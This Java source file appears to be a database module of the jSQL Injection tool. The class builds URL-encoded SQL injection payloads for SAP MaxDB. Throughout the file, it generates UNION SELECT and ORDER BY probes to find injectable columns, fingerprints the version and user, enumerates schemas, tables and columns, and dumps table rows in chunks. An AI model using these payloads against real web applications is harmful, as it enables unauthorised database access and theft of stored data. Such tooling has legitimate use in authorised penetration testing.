package com.jsql.model.injection.vendor;

import static com.jsql.model.accessible.DataAccess.QTE_SQL;
import static com.jsql.model.accessible.DataAccess.SEPARATOR_SQL;
import static com.jsql.model.accessible.DataAccess.TRAIL_SQL;

import java.util.ArrayList;
import java.util.List;

import com.jsql.model.MediatorModel;
import com.jsql.model.bean.database.Database;
import com.jsql.model.bean.database.Table;
import com.jsql.util.StringUtil;

public class MaxDbVendor extends AbstractVendorDefault {

    @Override
    public String getSqlInfos() {
        return
            "SELECT+'-'||id||'"+ SEPARATOR_SQL +"'||DATABASE()||'"+ SEPARATOR_SQL +"'||user()||'"+ TRAIL_SQL +"'r+from+sysinfo.VERSION";
    }

    @Override
    public String getSqlDatabases() {
        return
            "select+rr||'"+ TRAIL_SQL +"'r+from(select+'"+ SEPARATOR_SQL +"'||trim(t.schemaname)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
            "from(select+distinct+schemaname+from+SCHEMAS)t,(select+distinct+schemaname+from+SCHEMAS)t1+" +
            "where+t.schemaname>=t1.schemaname+" +
            "group+by+t.schemaname{limit})a";
    }

    @Override
    public String getSqlTables(Database database) {
        return
            "select+rr||'"+ TRAIL_SQL +"'r+from(select+'"+ SEPARATOR_SQL +"'||trim(t.tablename)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
            "from(select+distinct+tablename+from+TABLES+where+SCHEMANAME='" + database + "')t,(select+distinct+tablename+from+TABLES+where+SCHEMANAME='" + database + "')t1+" +
            "where+t.tablename>=t1.tablename+" +
            "group+by+t.tablename{limit})a";
    }

    @Override
    public String getSqlColumns(Table table) {
        return
            "select+rr||'"+ TRAIL_SQL +"'r+from(select+'"+ SEPARATOR_SQL +"'||trim(t.COLUMNNAME)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
            "from(select+distinct+COLUMNNAME+from+COLUMNS+where+SCHEMANAME='" + table.getParent() + "'and+TABLENAME='" + table + "')t,(select+distinct+COLUMNNAME+from+COLUMNS+where+SCHEMANAME='" + table.getParent() + "'and+TABLENAME='" + table + "')t1+" +
            "where+t.COLUMNNAME>=t1.COLUMNNAME+" +
            "group+by+t.COLUMNNAME{limit})a";
    }

    @Override
    public String getSqlRows(String[] columns, Database database, Table table) {
        String formatListColumn = StringUtil.join(columns, "{%}");
        
        // character 7f, last available hexa character (starting at character 80, it gives ?)
        formatListColumn = formatListColumn.replace("{%}", "),''))||'%7F'||trim(ifnull(chr(");
        formatListColumn = "trim(ifnull(chr(" + formatListColumn + "),''))";
        
        return
            "select+rr||'"+ TRAIL_SQL +"'r+from(select+'"+ SEPARATOR_SQL +"'||trim(t.s)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
            "from(select+distinct+" + formatListColumn + "s+from+" + database + "." + table + ")t,(select+distinct+" + formatListColumn + "s+from+" + database + "." + table + ")t1+" +
            "where+t.s>=t1.s+" +
            "group+by+t.s{limit})a";
    }

    @Override
    public String getSqlNormal(String sqlQuery, String startPosition) {
        return
            "select+'SQLi'||SUBSTR(r," + startPosition + ",1500)from(" + sqlQuery + ")x";
    }

    @Override
    public String getSqlIndicesCapacityCheck(String[] indexes) {
        return
            MediatorModel.model().getIndexesInUrl().replaceAll(
                "1337(" + StringUtil.join(indexes, "|") + ")7331",
                "(select'SQLi$1'||rpad('%23',1024,'%23',1025)||'iLQS'from+dual)"
            );
    }

    @Override
    public String getSqlIndices(Integer nbFields) {
        String replaceTag = "";
        List<String> fields = new ArrayList<>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("*");
            replaceTag = "select(1337"+ i +"7330%2b1)y+from+dual";
        }
        return "+union+select+" + StringUtil.join(fields.toArray(new String[fields.size()]), ",") + "+from(" + replaceTag + ")z+";
    }

    @Override
    public String getSqlOrderBy() {
        return "+order+by+1337--+";
    }

    @Override
    public String getSqlLimit(Integer limitSQLResult) {
        return "+having+count(*)+between+" + (limitSQLResult+1) + "+and+" + (limitSQLResult+1);
    }
}